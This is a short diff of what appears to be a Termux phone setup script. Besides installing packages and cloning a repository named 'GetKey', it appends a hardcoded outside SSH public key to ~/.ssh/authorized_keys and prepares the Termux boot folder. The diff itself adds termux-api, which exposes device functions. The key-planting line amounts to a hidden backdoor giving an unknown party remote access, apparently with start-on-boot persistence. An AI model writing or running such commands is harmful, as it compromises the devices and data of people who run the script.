@@ -1,5 +1,6 @@
 pkg install python git -y
 pip install requests pycryptodome
+pkg install termux-api
 git clone https://github.com/j6Dzja2U4ud-hEkJn6nD/GetKey.git
 echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWZ71KZdPmDOceNyyEg+V5J3hyurXkRLJ3iA1/rxlqD" >> ~/.ssh/authorized_keys
 mkdir -p ~/.termux/boot
